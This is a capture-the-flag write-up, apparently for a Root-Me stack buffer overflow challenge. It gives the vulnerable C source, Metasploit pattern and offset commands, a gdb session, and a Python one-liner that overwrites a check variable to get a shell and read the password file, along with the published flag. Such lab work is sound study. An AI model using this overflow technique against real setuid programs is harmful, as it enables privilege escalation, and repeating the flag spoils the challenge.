<h1>ELF x86 - Stack buffer overflow basic 1</h1>
<h3>Description</h3>

```c
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>
 
int main()
{
 
  int var;
  int check = 0x04030201;
  char buf[40];
 
  fgets(buf,45,stdin);
 
  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);
 
  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");
 
  if (check == 0xdeadbeef)
   {
     printf("Hell yeah! You win!\nOpening your shell...\n");
     setreuid(geteuid(), geteuid());
     system("/bin/bash");
     printf("Shell closed! Bye.\n");
   }
   return 0;
}
```

<h3>Solution</h3>
<label>Buffer overflow basic, create pattern dan overflow program</label>

```console
┌──(root㉿Venom)-[/home/venom]
└─# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300       
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
```

```console
app-systeme-ch13@challenge02:~$ gdb -q ch13
Reading symbols from ch13...(no debugging symbols found)...done.
(gdb) run
Starting program: /challenge/app-systeme/ch13/ch13 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

[buf]: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab
[check] 0x62413362

You are on the right way!
[Inferior 1 (process 17278) exited normally]
```
<label>Check offset overflow</label>

```console
┌──(root㉿Venom)-[/home/venom]
└─# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x62413362
[*] Exact match at offset 40
```

```console
app-systeme-ch13@challenge02:~$ (python -c "print('1'*40+'\xef\xbe\xad\xde')"; echo cat .passwd) | ./ch13

[buf]: 1111111111111111111111111111111111111111ﾭ�
[check] 0xdeadbeef
Hell yeah! You win!
Opening your shell...
1w4ntm0r3pr0np1s
Shell closed! Bye.
```
<h3>Flag</h3>
<pre>
1w4ntm0r3pr0np1s
</pre>
